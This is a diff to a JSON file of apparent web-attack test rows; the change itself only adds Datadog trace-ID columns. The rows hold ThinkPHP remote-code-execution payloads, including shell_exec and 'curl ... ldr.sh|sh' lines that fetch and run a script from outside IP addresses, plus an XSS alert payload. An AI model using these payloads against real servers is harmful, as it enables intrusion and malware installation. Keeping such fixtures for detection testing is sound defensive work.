@@ -67,6 +67,14 @@
   {
    "name": "weekstartday",
    "uuid": "bf40f670-1dc5-4220-9296-bcd387c7c407"
+  },
+  {
+   "name": "x_datadog_parent_id",
+   "uuid": "b27a9606-d008-4e69-8e99-aafe72f4b6e3"
+  },
+  {
+   "name": "x_datadog_trace_id",
+   "uuid": "0b83d64c-59de-4477-9791-68deefba4dbb"
   }
  ],
  "rows": [
@@ -87,7 +95,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "/Index/\\think\\app/invokefunction",
    "vars_0_": "NdNYddIL",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "5546474261994059416",
+   "x_datadog_trace_id": "3413734976020355918"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -106,7 +116,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "md5",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -125,7 +137,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "shell_exec",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -144,7 +158,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "__HelloThinkPHP",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -163,7 +179,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -182,7 +200,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "curl --user-agent curl_tp5 http://194.40.243.98/ldr.sh|sh",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -201,7 +221,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "h3VAvCd6",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   },
   {
    "PHPSESSID": "0123456789abcdef0123456789abcdef",
@@ -220,7 +242,9 @@
    "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "ZYbIXBxr",
-   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
+   "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))",
+   "x_datadog_parent_id": "2322981984032979414",
+   "x_datadog_trace_id": "5111118895474064356"
   }
  ]
 }
